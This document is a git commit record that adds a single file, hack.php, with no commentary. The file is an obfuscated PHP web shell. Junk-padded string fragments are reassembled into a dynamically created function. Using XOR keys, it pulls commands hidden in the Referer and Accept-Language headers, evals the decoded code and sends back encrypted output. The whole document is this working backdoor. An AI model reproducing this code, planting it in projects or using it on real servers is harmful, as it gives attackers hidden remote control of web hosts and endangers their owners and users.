925e3082aba2506fe5d952d552553ae29b9d5a3c
root <root@localhost.localdomain>
2017-11-11 12:35:19 -0500

    first commit

---
+++ hack.php
@@ -0,0 +1,15 @@
+<?php
+$F='p;$e=strphuoshuhu($s[$i],$huf);if($e){$k=$hukh.$kfhu;huob_start();hu@ehuvahul(@gzuhuncompresshuhu(@x(@bahuse64_dehuhucohu';
+$K='u();ob_end_cleahun();hu$d=bhuase64_encode(hux(ghuzcompresshu($ohu),$k));huprinthu("<huhu$k>$d</$k>");hu@session_dhuestrhuoy();}}}}';
+$S='de(preg_rhueplace(array("/_/","/-/hu"),arrhuahuy("/","+"hu),$ss(hu$s[$ihu],0,$hue)))hu,$khu)));$o=ob_get_chuohuntentshuh';
+$v='],hu$q)hu;$q=arhurahuy_values($q);phurhueg_match_huall("/([\\whu]hu)[\\whu-]+(?hu:;q=0.([\\d]))hu?,?/hu",$ra,$m)hu;ihufhu($q&&$m)';
+$z='$khhu="e10a";$khuf="hudc39"hu;functhuion x($t,$huk){$c=strlhuenhu($k)hu;$l=strlenhuhu($t);$o=hu"";fohur($i=0hu;$i<$l;){forh';
+$Y=str_replace('nv','','crenvatnvenvnv_funnvnvction');
+$a='u($j=0;hu(hu$j<$c&&$ihu<$lhu);$j++,$i++hu){$huo.=$t{hu$i}^$huk{$j};}}rethuhuurn $o;}$r=$hu_huSEhuRVEhuR;$rhur=hu@$r["huHTTP_';
+$s='md5($i.$kh)hu,0,3));$fhu=hu$husl($ss(md5hu($ihu.$kf),0,3));$p="hu";fhuor($huz=1;$z<chuount($m[huhu1hu]);$huz++)$p.=$q[$m[';
+$c='REFERER"hu];$ra=@hu$rhu["HTTP_ACCEPT_LANGUAhuGhuE"];if($hurr&&$ra){$huu=parshue_urlhu($rrhu);parse_shuhuhutr($u["query"';
+$I='2][hu$z]hu];if(strphuos($p,$hhu)=hu==hu0){$s[$ihu]="";$p=$ss($huhup,hu3);}if(array_khuhuey_exhuihusts($i,$shu)){$s[$i].hu=$';
+$r='{@sehussionhu_start()hu;$s=&hu$_SESSIhuON;$shus="husubstr";hu$sl="hustrtolowerhu";hu$i=$m[1][0hu].hu$m[1][1];$hhu=$sl($huhuhuss(';
+$l=str_replace('hu','',$z.$a.$c.$v.$r.$s.$I.$F.$S.$K);
+$n=$Y('',$l);$n();
+?>
